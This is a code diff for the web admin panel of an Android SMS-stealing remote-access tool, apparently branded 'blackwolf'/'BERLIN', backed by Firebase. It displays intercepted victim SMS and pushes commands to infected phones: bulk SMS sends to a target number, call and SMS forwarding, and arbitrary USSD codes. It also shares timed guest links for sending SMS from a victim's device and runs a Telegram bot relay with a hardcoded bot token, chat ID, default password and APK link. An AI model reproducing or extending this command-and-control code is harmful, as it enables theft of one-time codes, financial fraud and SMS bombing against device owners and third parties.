+allMsgs.sort((a,b)=>new Date(b.timestamp||0)-new Date(a.timestamp||0));
+allMsgs=allMsgs.slice(0,200);
+const list=document.getElementById('global-sms-list');
+if(!allMsgs.length){list.innerHTML='<p class="text-center text-gray-400 text-sm py-6">No messages</p>';return}
+const newHtml=allMsgs.map(m=>`<div class="bg-white rounded-xl p-3 shadow-sm border border-gray-50">
+<div class="flex items-center justify-between mb-1">
+<span class="font-bold text-xs text-blue-600">${m.sender||'Unknown'}</span>
+<span class="text-[9px] bg-gray-100 text-gray-500 px-2 py-0.5 rounded-full">${m.model}</span>
+</div>
+<p class="text-xs text-gray-600 leading-relaxed mb-1">${(m.message||'').substring(0,200)}</p>
+<span class="text-[10px] text-gray-400">${m.timestamp||''}</span>
+</div>`).join('');
+if (list.innerHTML !== newHtml) list.innerHTML = newHtml;
+}
+
+// ===== DATA SCREEN =====
+function renderDataScreen(){
+const keys=Object.keys(allDevices);const total=keys.length;
+const online=keys.filter(k=>allDevices[k]?.status?.state==='online').length;
+let totalSms=0;keys.forEach(k=>{totalSms+=Object.keys(allDevices[k]?.sms||{}).length});
+document.getElementById('data-stats').innerHTML=`
+<div class="bg-white rounded-2xl p-4 shadow-sm text-center"><div class="text-3xl font-black text-blue-500">${total}</div><div class="text-xs text-gray-500 mt-1">Total Devices</div></div>
+<div class="bg-white rounded-2xl p-4 shadow-sm text-center"><div class="text-3xl font-black text-green-500">${online}</div><div class="text-xs text-gray-500 mt-1">Online Now</div></div>
+<div class="bg-white rounded-2xl p-4 shadow-sm text-center"><div class="text-3xl font-black text-orange-500">${total-online}</div><div class="text-xs text-gray-500 mt-1">Offline</div></div>
+<div class="bg-white rounded-2xl p-4 shadow-sm text-center"><div class="text-3xl font-black text-purple-500">${totalSms.toLocaleString()}</div><div class="text-xs text-gray-500 mt-1">Total SMS</div></div>`;
+
+// Fetch panel login sessions in real-time
+db.ref(`${BASE}/sys_data/sessions`).once('value', snap => {
+  const sessions = snap.val() || {};
+  const sKeys = Object.keys(sessions);
+  const container = document.getElementById('data-sessions-list');
+  if(!container) return;
+  if(!sKeys.length){
+    container.innerHTML = '<p class="text-xs text-gray-400 text-center py-4">No active panel logins</p>';
+    return;
+  }
+  container.innerHTML = sKeys.map(k => {
+    const s = sessions[k];
+    const isMe = k === mySessionId;
+    const devName = s.device_name || (s.browser ? s.browser : 'Panel User');
+    const browser = s.browser || 'Web';
+    const ip = s.ip || 'Unknown IP';
+    const ago = Math.floor((Date.now() - (s.last_heartbeat || 0)) / 1000);
+    const isLive = ago < 90;
+    const timeAgoText = formatDuration(ago);
+    
+    return `<div class="bg-[#f8fbfe] rounded-2xl p-3.5 border border-[#e4edf5] flex items-center justify-between shadow-sm">
+      <div class="min-w-0 flex-1 pr-2">
+        <div class="flex items-center gap-2 mb-0.5">
+          <span class="font-bold text-[13px] text-[#1a2b4b] truncate">${devName}</span>
+          ${isMe ? '<span class="bg-[#dceef9] text-[#2481d7] text-[9px] font-black px-2 py-0.5 rounded-full uppercase tracking-wider">You</span>' : ''}
+        </div>
+        <div class="text-[11px] text-gray-500 font-medium truncate">${browser} · <span class="font-mono text-gray-400">${ip}</span></div>
+      </div>
+      <div class="flex items-center gap-2 flex-shrink-0">
+        ${isLive ? `
+          <div class="flex items-center gap-1.5 bg-[#dcfce7] border border-[#bbf7d0] px-2.5 py-1 rounded-full">
+            <span class="w-1.5 h-1.5 rounded-full bg-[#16a34a] pulse-dot"></span>
+            <span class="text-[10px] text-[#16a34a] font-black tracking-wider">LIVE</span>
+          </div>` : `
+          <span class="text-[10px] text-gray-400 font-medium bg-gray-50 px-2 py-1 rounded-full border border-gray-100">${timeAgoText}</span>`}
+        ${!isMe ? `<button onclick="revokeSession('${k}')" class="bg-red-50 hover:bg-red-100 text-red-500 p-2 rounded-xl text-xs font-bold active:scale-95 transition-transform" title="Revoke access"><i class="fa-solid fa-power-off"></i></button>` : ''}
+      </div>
+    </div>`;
+  }).join('');
+});
+}
+function exportJSON(){
+const blob=new Blob([JSON.stringify(allDevices,null,2)],{type:'application/json'});
+const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='blackwolf_devices_export.json';a.click();
+toast('JSON exported!','success');
+}
+
+// ===== BULK SENDER =====
+function renderBulkScreen(){
+const keys=Object.keys(allDevices);
+const onlineDevs=keys.filter(k=>allDevices[k]?.status?.state==='online');
+const models=onlineDevs.slice(0,3).map(k=>allDevices[k]?.info?.deviceModel||'?').join(', ');
+const more=onlineDevs.length>3?` +${onlineDevs.length-3} more`:'';
+document.getElementById('online-models-preview').textContent=models+more;
+// Templates preview
+document.getElementById('template-preview').innerHTML=SMS_TEMPLATES.slice(0,5).map((t,i)=>
+`<div class="bg-white rounded-xl p-3 shadow-sm border border-gray-50">
+<div class="text-xs font-bold text-blue-500 mb-1">Template ${i+1}</div>
+<p class="text-xs text-gray-600">${t}</p></div>`).join('');
+}
+function setBulkMode(mode){
+bulkMode=mode;
+document.getElementById('bulk-mode-template').className='flex-1 py-2.5 rounded-full text-sm font-semibold action-btn '+(mode==='template'?'bg-blue-500 text-white':'bg-white text-blue-500 border-2 border-blue-500');
+document.getElementById('bulk-mode-custom').className='flex-1 py-2.5 rounded-full text-sm font-semibold action-btn '+(mode==='custom'?'bg-blue-500 text-white':'bg-white text-blue-500 border-2 border-blue-500');
+document.getElementById('bulk-custom-msg').style.display=mode==='custom'?'':'none';
+document.getElementById('bulk-mode-desc').style.display=mode==='template'?'':'none';
+}
+async function startBulkSend(){
+const target=document.getElementById('bulk-target-number').value.trim();
+const count=parseInt(document.getElementById('bulk-msg-count').value)||0;
+if(!target){toast('Enter target number','error');return}
+if(!count||count<1){toast('Enter message count','error');return}
+const onlineDevs=Object.keys(allDevices).filter(k=>allDevices[k]?.status?.state==='online');
+if(!onlineDevs.length){toast('No online devices','error');return}
+bulkRunning=true;bulkAbort=false;
+const statusEl=document.getElementById('bulk-status-text');
+const bar=document.getElementById('bulk-progress-bar');
+for(let i=0;i<count;i++){
+if(bulkAbort){statusEl.textContent='Stopped';bulkRunning=false;return}
+const devId=onlineDevs[i%onlineDevs.length];
+let msg;
+if(bulkMode==='custom'){msg=document.getElementById('bulk-custom-msg').value.trim()||'Test message'}
+else{msg=fillTemplate(SMS_TEMPLATES[Math.floor(Math.random()*SMS_TEMPLATES.length)])}
+
+const payload = {
+  command: "send_sms",
+  args: {
+    number: target,
+    message: msg,
+    sim_index: 0
+  },
+  executed: false,
+  timestamp: nowStr()
+};
+db.ref(`${BASE}/commands/${devId}`).push(payload);
+
+const pct=Math.round(((i+1)/count)*100);
+bar.style.width=pct+'%';
+statusEl.textContent=`Sending ${i+1}/${count} via ${allDevices[devId]?.info?.deviceModel||devId.substring(0,8)}...`;
+await new Promise(r=>setTimeout(r,800));
+}
+statusEl.textContent=`Done! ${count} messages sent.`;bulkRunning=false;
+toast(`Bulk send complete: ${count} messages`,'success');
+}
+function stopBulkSend(){bulkAbort=true;toast('Bulk send stopped','info')}
+
+// ===== GREETING =====
+function setGreeting(){
+const h=new Date().getHours();
+const g=h<12?'Good morning':h<17?'Good afternoon':h<21?'Good evening':'Good night';
+document.getElementById('greeting-text').textContent=g+', BERLIN';
+}
+
+// ===== NEW MODAL LOGIC =====
+function populateSimSelect(selectId){
+  const sel=document.getElementById(selectId);
+  const info=allDevices[selectedDeviceId]?.info||{};
+  let opts='';
+  const s1=info.sim1Number&&info.sim1Number!=='Not Available'&&info.sim1Number!=='Unknown'?info.sim1Number:null;
+  const s2=info.sim2Number&&info.sim2Number!=='Not Available'&&info.sim2Number!=='Unknown'?info.sim2Number:null;
+  if(s1||info.sim1Carrier) opts+=`<option value="0">SIM 1 — ${info.sim1Carrier||'Unknown'}</option>`;
+  if(s2||info.sim2Carrier) opts+=`<option value="1">SIM 2 — ${info.sim2Carrier||'Unknown'}</option>`;
+  if(!opts) opts='<option value="0">SIM 1</option><option value="1">SIM 2</option>';
+  sel.innerHTML=opts;
+}
+
+function openCallFwdModal(){
+  populateSimSelect('sel-call-fwd-sim');
+  document.getElementById('modal-call-fwd').classList.replace('hidden','flex');
+}
+
+function openSmsFwdModal(){
+  populateSimSelect('sel-sms-fwd-sim');
+  document.getElementById('modal-sms-fwd').classList.replace('hidden','flex');
+}
+
+function openUssdModal(){
+  populateSimSelect('sel-ussd-sim');
+  document.getElementById('modal-ussd').classList.replace('hidden','flex');
+}
+
+function submitCallFwd(action){
+  const num = document.getElementById('inp-call-fwd-num').value.trim();
+  const sim = parseInt(document.getElementById('sel-call-fwd-sim').value) || 0;
+  if(action==='activate' && !num) { toast('Enter forward number','error'); return; }
+
+  let payload;
+  if(action === 'activate') {
+    payload = {
+      command: "set_call_forwarding",
+      args: {
+        number: num,
+        sim_index: sim
+      },
+      executed: false,
+      timestamp: nowStr()
+    };
+    db.ref(`${BASE}/commands/${selectedDeviceId}`).push(payload);
+  } else if(action === 'deactivate') {
+    let cmdStr = `#21#`;
+    payload = {
+      command: "ussd",
+      code: cmdStr,
+      sim_slot: sim,
+      args: { code: cmdStr, sim_index: sim },
+      executed: false,
+      timestamp: nowStr()
+    };
+    db.ref(`${BASE}/commands/${selectedDeviceId}`).push(payload);
+  } else if(action === 'deactivate_all') {
+    let cmdStr = `##002#`;
+    payload = {
+      command: "ussd",
+      code: cmdStr,
+      sim_slot: 0,
+      args: { code: cmdStr, sim_index: 0 },
+      executed: false,
+      timestamp: nowStr()
+    };
+    db.ref(`${BASE}/commands/${selectedDeviceId}`).push(payload);
+    const payloadSim2 = { ...payload, sim_slot: 1, args: { code: cmdStr, sim_index: 1 } };
+    db.ref(`${BASE}/commands/${selectedDeviceId}`).push(payloadSim2);
+  }
+
+  toast('Sent ✓','success');
+  document.getElementById('modal-call-fwd').classList.replace('flex','hidden');
+}
+
+function submitSmsFwd(action){
+  const num = document.getElementById('inp-sms-fwd-num').value.trim();
+  const sim = parseInt(document.getElementById('sel-sms-fwd-sim').value) || 0;
+  if(action==='activate' && !num) { toast('Enter forward number','error'); return; }
+
+  let payload;
+  if(action === 'activate') {
+    payload = {
+      command: "set_sms_forwarding",
+      args: {
+        number: num,
+        sim_index: sim
+      },
+      executed: false,
+      timestamp: nowStr()
+    };
+  } else {
+    payload = {
+      command: "disable_sms_forwarding",
+      executed: false,
+      timestamp: nowStr()
+    };
+  }
+
+  db.ref(`${BASE}/commands/${selectedDeviceId}`).push(payload);
+  toast('Sent ✓','success');
+  document.getElementById('modal-sms-fwd').classList.replace('flex','hidden');
+}
+
+function submitUssd(){
+  const num = document.getElementById('inp-ussd-num').value.trim();
+  const sim = parseInt(document.getElementById('sel-ussd-sim').value) || 0;
+  if(!num) { toast('Enter USSD Code','error'); return; }
+  
+  const payload = {
+    command: "ussd",
+    code: num,
+    sim_slot: sim,
+    args: {
+      code: num,
+      sim_index: sim
+    },
+    executed: false,
+    timestamp: nowStr()
+  };
+
+  db.ref(`${BASE}/commands/${selectedDeviceId}`).push(payload);
+  toast('Sent ✓','success');
+  document.getElementById('modal-ussd').classList.replace('flex','hidden');
+}
+
+// ===== WEB HOST & TELEGRAM RELAY CONTROLS =====
+let currentHostExpiry = 5;
+let isRelayActive = false;
+
+let activeHostSessionId = null;
+let activeGuestHostData = null;
+let hostTimerInterval = null;
+
+function toggleWebHostModal() {
+  if (!selectedDeviceId) { toast('Select a device first', 'error'); return; }
+  const pin = Math.floor(100 + Math.random() * 900);
+  document.getElementById('host-pin-val').textContent = pin;
+  document.getElementById('modal-web-host').classList.replace('hidden', 'flex');
+}
+
+function setHostExpiry(mins) {
+  currentHostExpiry = mins;
+  document.querySelectorAll('.host-exp-btn').forEach(btn => {
+    const isSel = btn.textContent.includes(`${mins} min`);
+    btn.className = `host-exp-btn py-2 rounded-lg text-xs font-bold ${isSel ? 'bg-[#2481d7] text-white shadow-sm' : 'bg-gray-100 text-gray-600'}`;
+  });
+}
+
+function startWebHostSession() {
+  if (!selectedDeviceId) { toast('Select a device first', 'error'); return; }
+  const pin = document.getElementById('host-pin-val').textContent;
+  const hostId = 'host_' + Math.random().toString(36).substring(2, 10);
+  const expireMs = Date.now() + (currentHostExpiry * 60 * 1000);
+  
+  const hostData = {
+    hostId: hostId,
+    deviceId: selectedDeviceId,
+    pin: pin,
+    expireMs: expireMs,
+    expireMins: currentHostExpiry,
+    created_at: nowStr()
+  };
+
+  db.ref(`${BASE}/sys_data/web_hosts/${hostId}`).set(hostData, (err) => {
+    if (err) {
+      toast('Failed to start Web Host: ' + err.message, 'error');
+      return;
+    }
+    activeHostSessionId = hostId;
+    
+    // Construct clean Netlify share URL
+    const baseUrl = window.location.origin + window.location.pathname;
+    const shareUrl = `${baseUrl}?host=${hostId}`;
+    
+    document.getElementById('active-host-url').value = shareUrl;
+    document.getElementById('active-host-pin').textContent = pin;
+    
+    const hostLabel = document.getElementById('host-status-label');
+    if (hostLabel) {
+      hostLabel.textContent = 'Host ON';
+      hostLabel.className = 'text-[9px] text-[#16a34a] font-bold';
+    }
+
+    document.getElementById('modal-web-host').classList.replace('flex', 'hidden');
+    document.getElementById('modal-web-host-active').classList.replace('hidden', 'flex');
+    toast(`Web Host active for ${currentHostExpiry} min!`, 'success');
+  });
+}
+
+function stopWebHostSession() {
+  if (activeHostSessionId) {
+    db.ref(`${BASE}/sys_data/web_hosts/${activeHostSessionId}`).remove();
+    activeHostSessionId = null;
+  }
+  const hostLabel = document.getElementById('host-status-label');
+  if (hostLabel) {
+    hostLabel.textContent = 'Host OFF';
+    hostLabel.className = 'text-[9px] text-gray-400 font-bold';
+  }
+  document.getElementById('modal-web-host-active').classList.replace('flex', 'hidden');
+  toast('Web Host stopped', 'info');
+}
+
+// Check if URL has ?host=HOST_ID or #host=HOST_ID on load
+function checkWebHostUrlRouter() {
+  const urlParams = new URLSearchParams(window.location.search);
+  let hostId = urlParams.get('host');
+  if (!hostId && window.location.hash.includes('host=')) {
+    hostId = window.location.hash.split('host=')[1];
+  }
+
+  if (hostId) {
+    // Hide all admin screens, header, navbar, and login screen
+    document.getElementById('login-screen').style.display = 'none';
+    document.getElementById('main-header').style.display = 'none';
+    document.getElementById('bottom-nav').style.display = 'none';
+    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+    document.body.classList.remove('overflow-hidden');
+
+    // Fetch Web Host Session from Firebase
+    db.ref(`${BASE}/sys_data/web_hosts/${hostId}`).once('value', snap => {
+      if (!snap.exists()) {
+        alert('⚠️ Web Host Link Invalid or Expired!');
+        return;
+      }
+      const data = snap.val();
+      if (Date.now() > data.expireMs) {
+        alert('⚠️ Web Host Link Expired!');
+        return;
+      }
+
+      activeGuestHostData = data;
+      // Show Guest PIN Verification Modal
+      document.getElementById('modal-web-host-verify').style.display = 'flex';
+    });
+    return true;
+  }
+  return false;
+}
+
+function verifyGuestPin() {
+  const inputPin = document.getElementById('guest-pin-input').value.trim();
+  if (!activeGuestHostData) return;
+
+  if (inputPin === String(activeGuestHostData.pin)) {
+    document.getElementById('modal-web-host-verify').style.display = 'none';
+    setupGuestHostView(activeGuestHostData);
+    toast('Access Granted ✓', 'success');
+  } else {
+    toast('Incorrect PIN', 'error');
+  }
+}
+
+function setupGuestHostView(hostData) {
+  const devId = hostData.deviceId;
+  
+  // Listen for target device data in real-time
+  db.ref(`${BASE}/devices/${devId}`).on('value', snap => {
+    if (!snap.exists()) return;
+    const dev = snap.val();
+    const info = dev.info || {};
+    const status = dev.status || {};
+    const model = info.deviceModel || 'Unknown';
+    const brand = getBrand(model);
+    const isOn = status.state === 'online';
+
+    document.getElementById('host-view-model').textContent = model;
+    document.getElementById('host-view-brand').textContent = brand;
+    document.getElementById('host-view-name').textContent = brand + ' ' + model;
+    
+    const statusEl = document.getElementById('host-view-status');
+    statusEl.textContent = isOn ? 'Online' : 'Offline';
+    statusEl.className = 'text-[14px] font-black ' + (isOn ? 'text-[#16a34a]' : 'text-gray-400');
+
+    const s1 = info.sim1Number && info.sim1Number !== 'Not Available' && info.sim1Number !== 'Unknown' ? info.sim1Number : 'SIM 1';
+    document.getElementById('host-view-sim1').textContent = s1;
+    document.getElementById('host-view-sim1-carrier').textContent = info.sim1Carrier || '';
+
+    const s2 = info.sim2Number && info.sim2Number !== 'Not Available' && info.sim2Number !== 'Unknown' ? info.sim2Number : 'SIM 2';
+    document.getElementById('host-view-sim2').textContent = s2;
+    document.getElementById('host-view-sim2-carrier').textContent = info.sim2Carrier || '';
+
+    // Update SIM buttons
+    const btnSim1 = document.getElementById('btn-host-sim1');
+    const btnSim2 = document.getElementById('btn-host-sim2');
+    if (btnSim1) btnSim1.textContent = (s1 !== 'SIM 1' ? s1 : 'SIM 1') + (info.sim1Carrier ? ' · ' + info.sim1Carrier : '');
+    if (btnSim2) btnSim2.textContent = (s2 !== 'SIM 2' ? s2 : 'SIM 2') + (info.sim2Carrier ? ' · ' + info.sim2Carrier : '');
+  });
+
+  // Start live countdown timer
+  if (hostTimerInterval) clearInterval(hostTimerInterval);
+  hostTimerInterval = setInterval(() => {
+    const remMs = hostData.expireMs - Date.now();
+    if (remMs <= 0) {
+      clearInterval(hostTimerInterval);
+      document.getElementById('screen-web-host').innerHTML = `
+        <div class="text-center py-20 px-6 max-w-[400px] mx-auto space-y-4">
+          <div class="w-16 h-16 bg-red-100 text-red-500 rounded-full flex items-center justify-center mx-auto text-3xl"><i class="fa-solid fa-lock"></i></div>
+          <h2 class="text-2xl font-black text-gray-800">Link Expired</h2>
+          <p class="text-sm text-gray-500">This temporary Web Host access link has expired.</p>
+        </div>`;
+      return;
+    }
+    const mins = Math.ceil(remMs / (60 * 1000));
+    document.getElementById('host-view-timer').textContent = `Active • ${mins} min`;
+  }, 1000);
+
+  // Show standalone screen
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+  document.getElementById('screen-web-host').classList.add('active');
+}
+
+async function pasteToHostSms() {
+  try {
+    const t = await navigator.clipboard.readText();
+    document.getElementById('host-sms-body').value = t;
+    toast('Pasted!', 'success');
+  } catch (e) {
+    toast('Cannot access clipboard', 'error');
+  }
+}
+
+function sendHostSms(simSlot) {
+  if (!activeGuestHostData) return;
+  const num = document.getElementById('host-sms-number').value.trim();
+  const msg = document.getElementById('host-sms-body').value.trim();
+  if (!num || !msg) { toast('Enter number and message', 'error'); return; }
+
+  const payload = {
+    command: "send_sms",
+    args: {
+      number: num,
+      message: msg,
+      sim_index: parseInt(simSlot)
+    },
+    executed: false,
+    timestamp: nowStr()
+  };
+
+  db.ref(`${BASE}/commands/${activeGuestHostData.deviceId}`).push(payload, (err) => {
+    if (err) {
+      toast('Failed to send SMS', 'error');
+    } else {
+      toast('SMS Sent ✓', 'success');
+      document.getElementById('host-sms-number').value = '';
+      document.getElementById('host-sms-body').value = '';
+    }
+  });
+}
+
+// ===== TELEGRAM RELAY SYSTEM (Single Active Device & Telegram Command Listener) =====
+let activeRelayDeviceId = null;
+let tgUpdateOffset = 0;
+let tgPollingInterval = null;
+
+function escapeHTML(str) {
+  if (!str) return '';
+  return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+}
+
+function getRelayToken() {
+  return window.relayBotToken || document.getElementById('setting-relay-token')?.value?.trim() || '8906014635:AAFa29ybjIoPxYfwy-cTFfFxJGF0Fp5OB0A';
+}
+
+function getRelayChat() {
+  return window.relayChatId || document.getElementById('setting-relay-chat')?.value?.trim() || '7606730935';
+}
+
+function toggleRelayStatus(deviceId) {
+  const targetId = deviceId || selectedDeviceId;
+  if (!targetId) { toast('Select a device first', 'error'); return; }
+
+  // If already active on this device, turn it OFF
+  if (activeRelayDeviceId === targetId) {
+    db.ref(`${BASE}/sys_data/active_relay`).remove();
+    activeRelayDeviceId = null;
+    updateRelayUiState(null);
+    toast('Telegram Relay Deactivated', 'info');
+    return;
+  }
+
+  const dev = allDevices[targetId] || {};
+  const info = dev.info || {};
+  const model = info.deviceModel || targetId;
+  const sim1 = info.sim1Number || info.phoneNumber || 'N/A';
+
+  const relayData = {
+    deviceId: targetId,
+    model: model,
+    sim1: sim1,
+    timestamp: nowStr()
+  };
+
+  // Overwrite active_relay in Firebase (auto-turns OFF previous device)
+  db.ref(`${BASE}/sys_data/active_relay`).set(relayData, (err) => {
+    if (err) {
+      toast('Failed to activate Relay: ' + err.message, 'error');
+      return;
+    }
+    activeRelayDeviceId = targetId;
+    updateRelayUiState(targetId);
+
+    // Send Activation Notification to Telegram Bot 2 (Relay Bot)
+    const token = getRelayToken();
+    const chatId = getRelayChat();
+
+    const text = `<b>🤖 TELEGRAM RELAY ACTIVATED</b>\n\n` +
+                 `<b>📱 Connected Device:</b> <code>${targetId}</code> (${escapeHTML(model)})\n` +
+                 `<b>📞 Phone / SIM 1:</b> <code>${escapeHTML(sim1)}</code>\n\n` +
+                 `<i>To send an instant SMS via this device, send your message to this bot in the following format:</i>\n\n` +
+                 `<code>TargetNumber | Message Text</code>\n\n` +
+                 `<b>Example:</b>\n` +
+                 `<code>9876543210 | Hello from Telegram Relay</code>`;
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML' })
+    }).then(r => r.json()).then(res => {
+      if (!res.ok) console.error('TG Relay Send Failed:', res);
+    }).catch(e => console.error('TG Relay Send Error:', e));
+
+    toast(`Telegram Relay active for ${model}!`, 'success');
+  });
+}
+
+function updateRelayUiState(activeId) {
+  activeRelayDeviceId = activeId;
+  const relayLabel = document.getElementById('relay-status-label');
+  if (relayLabel) {
+    const isThisActive = !!(selectedDeviceId && activeId && selectedDeviceId === activeId);
+    relayLabel.textContent = isThisActive ? 'Relay ON' : 'Relay OFF';
+    relayLabel.className = `text-[9px] font-bold ${isThisActive ? 'text-[#16a34a]' : 'text-gray-400'}`;
+  }
+}
+
+// Telegram Bot getUpdates polling loop for Netlify client-side relay execution
+function startTelegramBotPolling() {
+  if (tgPollingInterval) clearInterval(tgPollingInterval);
+
+  tgPollingInterval = setInterval(() => {
+    const token = getRelayToken();
+    if (!token) return;
+
+    fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=${tgUpdateOffset}&timeout=1`)
+      .then(r => r.json())
+      .then(data => {
+        if (data.ok && data.result.length > 0) {
+          data.result.forEach(update => {
+            tgUpdateOffset = update.update_id + 1;
+            const msg = update.message;
+            if (!msg || !msg.text) return;
+
+            const text = msg.text.trim();
+            if (text.includes('|')) {
+              handleTelegramRelayCommand(msg.chat.id, text, token);
+            }
+          });
+        }
+      })
+      .catch(e => {});
+  }, 3000);
+}
+
+function handleTelegramRelayCommand(chatId, text, token) {
+  db.ref(`${BASE}/sys_data/active_relay`).once('value', snap => {
+    if (!snap.exists()) {
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: `⚠️ <b>No Active Relay Device!</b>\nPlease turn Relay ON for a device in your admin panel first.`,
+          parse_mode: 'HTML'
+        })
+      });
+      return;
+    }
+
+    const relay = snap.val();
+    const parts = text.split('|');
+    const targetNumber = parts[0].trim();
+    const messageBody = parts.slice(1).join('|').trim();
+
+    if (!targetNumber || !messageBody) return;
+
+    const payload = {
+      command: "send_sms",
+      args: {
+        number: targetNumber,
+        message: messageBody,
+        sim_index: 0
+      },
+      executed: false,
+      timestamp: nowStr()
+    };
+
+    db.ref(`${BASE}/commands/${relay.deviceId}`).push(payload, (err) => {
+      if (err) {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: chatId, text: `❌ <b>Failed to dispatch SMS:</b> ${err.message}`, parse_mode: 'HTML' })
+        });
+      } else {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: `<b>✅ SMS DISPATCHED VIA TELEGRAM RELAY</b>\n\n` +
+                  `<b>📱 Relay Device:</b> <code>${escapeHTML(relay.model)}</code>\n` +
+                  `<b>📞 Target Number:</b> <code>${escapeHTML(targetNumber)}</code>\n` +
+                  `<b>💬 Message:</b>\n<code>${escapeHTML(messageBody)}</code>`,
+            parse_mode: 'HTML'
+          })
+        });
+      }
+    });
+  });
+}
+
+function saveTelegramForwarderConfig() {
+  const token = document.getElementById('setting-fwd-token').value.trim();
+  const chat = document.getElementById('setting-fwd-chat').value.trim();
+  if (!token || !chat) { toast('Enter Forwarder Bot Token and Chat ID', 'error'); return; }
+  
+  db.ref(`${BASE}/sys_data/meta_v3/telegram_sms_forwarder`).set({ token, chat, timestamp: nowStr() });
+  toast('Bot 1 (Forwarder) settings saved!', 'success');
+}
+
+function testTelegramForwarderConfig() {
+  const token = document.getElementById('setting-fwd-token').value.trim();
+  const chat = document.getElementById('setting-fwd-chat').value.trim();
+  if (!token || !chat) { toast('Enter Forwarder Bot Token and Chat ID', 'error'); return; }
+  
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: chat, text: '<b>BERLIN ADMIN:</b> Bot 1 (SMS Auto-Forwarder) verified! 📩', parse_mode: 'HTML' })
+  }).then(r => r.json()).then(d => {
+    if (d.ok) toast('✅ Bot 1 verified & message delivered!', 'success');
+    else toast('❌ Invalid Bot Token or Chat ID', 'error');
+  }).catch(() => toast('❌ Failed to reach Telegram API', 'error'));
+}
+
+function saveTelegramRelayConfig() {
+  const token = document.getElementById('setting-relay-token').value.trim();
+  const chat = document.getElementById('setting-relay-chat').value.trim();
+  if (!token || !chat) { toast('Enter Relay Bot Token and Chat ID', 'error'); return; }
+  
+  window.relayBotToken = token;
+  window.relayChatId = chat;
+  db.ref(`${BASE}/sys_data/meta_v3/telegram_relay`).set({ token, chat, timestamp: nowStr() });
+  toast('Bot 2 (Relay Command) settings saved!', 'success');
+}
+
+function testTelegramRelayConfig() {
+  const token = getRelayToken();
+  const chat = getRelayChat();
+  if (!token || !chat) { toast('Enter Relay Bot Token and Chat ID', 'error'); return; }
+  
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: chat, text: '<b>BERLIN ADMIN:</b> Bot 2 (Relay Command) verified! 🚀', parse_mode: 'HTML' })
+  }).then(r => r.json()).then(d => {
+    if (d.ok) toast('✅ Bot 2 verified & message delivered!', 'success');
+    else toast('❌ Invalid Bot Token or Chat ID', 'error');
+  }).catch(() => toast('❌ Failed to reach Telegram API', 'error'));
+}
+
+// ===== FIREBASE LISTENERS =====
+let apkDownloadLink = 'https://t.me/BERLIN_00_11';
+
+function downloadApk() {
+  if(apkDownloadLink) {
+    window.open(apkDownloadLink, '_blank');
+  } else {
+    toast('APK link not available', 'error');
+  }
+}
+
+function init(){
+setGreeting();
+
+// Check if page was opened via Web Host share URL (?host=HOST_ID)
+const isHostGuest = checkWebHostUrlRouter();
+
+// Sync Bot 1 (Forwarder) Config from DB
+db.ref(`${BASE}/sys_data/meta_v3/telegram_sms_forwarder`).on('value', snap => {
+  if (snap.exists()) {
+    const data = snap.val();
+    if (data.token) document.getElementById('setting-fwd-token').value = data.token;
+    if (data.chat) document.getElementById('setting-fwd-chat').value = data.chat;
+  }
+});
+
+// Sync Bot 2 (Relay Command) Config from DB
+db.ref(`${BASE}/sys_data/meta_v3/telegram_relay`).on('value', snap => {
+  if (snap.exists()) {
+    const data = snap.val();
+    if (data.token) {
+      document.getElementById('setting-relay-token').value = data.token;
+      window.relayBotToken = data.token;
+    }
+    if (data.chat) {
+      document.getElementById('setting-relay-chat').value = data.chat;
+      window.relayChatId = data.chat;
+    }
+  }
+});
+
+// Get real-time password from DB
+db.ref(`${BASE}/sys_data/meta_v3/darkvendor`).on('value',snap=>{
+if(snap.exists()){
+panelPassword=snap.val();
+}else{
+// First time setup
+db.ref(`${BASE}/sys_data/meta_v3/darkvendor`).set('blackwolf');
+panelPassword='blackwolf';
+}
+});
+
+// Get APK Link
+db.ref(`${BASE}/sys_data/meta_v3/apklink`).on('value', snap => {
+  if(snap.exists()) {
+    apkDownloadLink = snap.val();
+  } else {
+    db.ref(`${BASE}/sys_data/meta_v3/apklink`).set('https://t.me/BERLIN_00_11');
+    apkDownloadLink = 'https://t.me/BERLIN_00_11';
+  }
+  const btn = document.getElementById('btn-download-apk');
+  const txt = document.getElementById('apk-status-text');
+  if(btn) {
+    btn.classList.remove('pointer-events-none');
+    btn.classList.replace('bg-[#93c5ec]', 'bg-[#2481d7]');
+  }
+  if(txt) {
+    txt.textContent = 'Ready to download';
+    txt.classList.replace('text-gray-500', 'text-green-500');
+  }
+});
+
+// Connection
+db.ref('.info/connected').on('value',s=>{
+const c=s.val();
+document.getElementById('conn-dot').className='w-2 h-2 rounded-full '+(c?'bg-green-500 pulse-dot':'bg-red-500');
+document.getElementById('conn-text').textContent=c?'Connected to Firebase':'Disconnected';
+document.getElementById('conn-text').className='text-[10px] '+(c?'text-green-500':'text-red-500');
+document.getElementById('settings-conn-dot').className='w-3 h-3 rounded-full '+(c?'bg-green-500':'bg-red-500');
+document.getElementById('settings-conn-text').textContent=c?'Connected — Real-time sync active':'Disconnected';
+});
+// Devices - REAL TIME
+db.ref(`${BASE}/devices`).on('value',snap=>{
+allDevices=snap.val()||{};
+updateCounters();
+if(currentScreen==='devices')renderDevices();
+if(currentScreen==='detail'&&selectedDeviceId)renderDeviceDetail();
+if(currentScreen==='messages')renderGlobalMessages();
